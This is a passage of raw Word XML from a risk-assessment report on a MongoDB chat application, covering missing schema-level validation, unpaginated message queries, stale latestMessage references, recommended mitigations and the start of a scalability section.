      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>deliveredTo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> set (a message cannot be read before being delivered). However, this invariant is enforced only through application logic:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// messageControllers.js — Application-level enforcement:</w:t>
        <w:br/>
        <w:t>$addToSet: {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    readBy: userId,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    deliveredTo: userId,    // Always updated together</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">The MongoDB schema itself has </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>no constraint</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> preventing a direct database operation from adding a userId to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>readBy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> without also adding it to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>deliveredTo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// messageModel.js — No cross-field validation:</w:t>
        <w:br/>
        <w:t>deliveredTo: [{ type: mongoose.Schema.Types.ObjectId, ref: "User" }],</w:t>
        <w:br/>
        <w:t>readBy: [{ type: mongoose.Schema.Types.ObjectId, ref: "User" }],</w:t>
        <w:br/>
        <w:t>// No schema-level validator ensures readBy ⊆ deliveredTo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Vulnerability B — No Message Pagination:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// messageControllers.js, lines 11-17:</w:t>
        <w:br/>
        <w:t>const messages = await Message.find({</w:t>
        <w:br/>
        <w:t xml:space="preserve">    chat: req.params.chatId,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    deletedFor: { $ne: req.user._id },</w:t>
        <w:br/>
        <w:t>})</w:t>
        <w:br/>
        <w:t xml:space="preserve">    .populate("sender", "name pic username")</w:t>
        <w:br/>
        <w:t xml:space="preserve">    .populate("chat");</w:t>
        <w:br/>
        <w:t>res.json(messages);   // Returns ALL messages — no limit, no pagination</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">This query returns </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>every message</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> in a chat without any </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>limit</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>skip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> parameter. For a group chat with 100,000 messages, this results in: - Extremely large MongoDB query result sets consuming server memory - Multi-megabyte JSON response payloads transmitted over the network - Browser UI freezing or crashing when rendering tens of thousands of DOM elements</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Vulnerability C — `latestMessage` Reference Staleness:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>Chat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> model maintains a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>latestMessage</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> field that references the most recent message. This field is updated in multiple places (send message, delete message, clear chat), creating potential for inconsistency if one update path fails:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// chatModel.js:</w:t>
        <w:br/>
        <w:t>latestMessage: { type: mongoose.Schema.Types.ObjectId, ref: "Message" }</w:t>
        <w:br/>
        <w:t>// This is a denormalized reference that can become stale if the referenced message is deleted</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.3 Threat Scenario</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">1. A group chat accumulates 50,000 messages over several months. 2. A user opens the chat, triggering </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>GET /api/message/:chatId</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>. 3. The server attempts to load all 50,000 documents into memory. 4. Server memory spikes, potentially causing other requests to be delayed or rejected. 5. The 50,000-message JSON response takes several seconds to transmit. 6. The client browser becomes unresponsive while parsing and rendering the data.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.4 Current Mitigation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">- The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>$addToSet</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> operator prevents duplicate entries in both arrays. - Application code consistently updates both </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>readBy</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>deliveredTo</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> together. - Message deletion handlers update </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="C0392B"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>latestMessage</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> to the previous message.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5.5 Recommended Mitigation</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="autofit"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3120"/>
        <w:gridCol w:w="3120"/>
        <w:gridCol w:w="3120"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Mitigation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Priority</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="2C3E50" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Effort</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Implement cursor-based pagination for message history (limit 50 per request)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Add a Mongoose custom validator to enforce </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>readBy ⊆ deliveredTo</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> at schema level</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">Add database indexes on </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Message.chat</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> + </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="C0392B"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Message.createdAt</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve"> for efficient paginated queries</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Implement virtual scroll in the frontend to render only visible messages</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3120"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:left w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:bottom w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
              <w:right w:val="single" w:sz="4" w:space="0" w:color="AAAAAA"/>
            </w:tcBorders>
            <w:shd w:fill="F8F9FA" w:val="clear"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>High</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>6. Risk Area 5: Scalability Constraints</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Severity: 🟡 MEDIUM</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.1 Identification</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>The current architecture is designed for single-process, single-server deployment, which limits horizontal scalability and imposes performance ceilings as the user base grows.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>6.2 Evidence</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Constraint A — Single Process Architecture:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
        <w:ind w:left="283" w:right="283"/>
        <w:shd w:fill="F4F4F4" w:val="clear"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:i/>
          <w:color w:val="646464"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>[javascript]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="282828"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// server.js:</w:t>
        <w:br/>
        <w:t>const server = app.listen(PORT, ...);</w:t>
        <w:br/>
